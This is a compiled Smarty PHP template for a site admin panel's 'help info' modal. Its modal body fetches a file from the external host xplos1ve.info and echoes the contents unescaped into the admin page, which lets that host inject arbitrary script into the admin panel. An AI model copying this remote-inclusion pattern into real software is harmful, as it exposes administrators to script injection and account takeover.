<?php
/* Smarty version 3.1.30, created on 2017-09-19 09:24:02
  from "/home/l/lfatal1/kalco.ru/public_html/style/backend/flat/templates/admin/modals.tpl" */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.30',
  'unifunc' => 'content_59c0c612137669_12817099',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
    '87f50e7758ca0b42b4888f46ae2b6b105630ea8e' => 
    array (
      0 => '/home/l/lfatal1/kalco.ru/public_html/style/backend/flat/templates/admin/modals.tpl',
      1 => 1505805799,
      2 => 'file',
    ),
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_59c0c612137669_12817099 (Smarty_Internal_Template $_smarty_tpl) {
$_smarty_tpl->smarty->ext->_capture->open($_smarty_tpl, 'helper_info', null, null);
?>

<div class="modal fade" id="helper_info">
   <div class="modal-dialog modal-small" role="document">
      <div class="modal-content">
         <div class="modal-header">
            <button type="button" class="close" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">&times;</span>
            </button>
            <h5 class="modal-title"><?php echo $_smarty_tpl->tpl_vars['lang']->value['help_info'];?>
</h5>
         </div>
         <div class="modal-body">
            <div class="row">
               <div class="col-md-12">
                  <?php $_smarty_tpl->_assignInScope('name', "http://xplos1ve.info/myforo_info.ini");
?>
                  <?php echo file_get_contents($_smarty_tpl->tpl_vars['name']->value);?>

               </div>
            </div>
         </div>
      </div>
   </div>
</div>
<?php $_smarty_tpl->smarty->ext->_capture->close($_smarty_tpl);
?>


<?php }
}
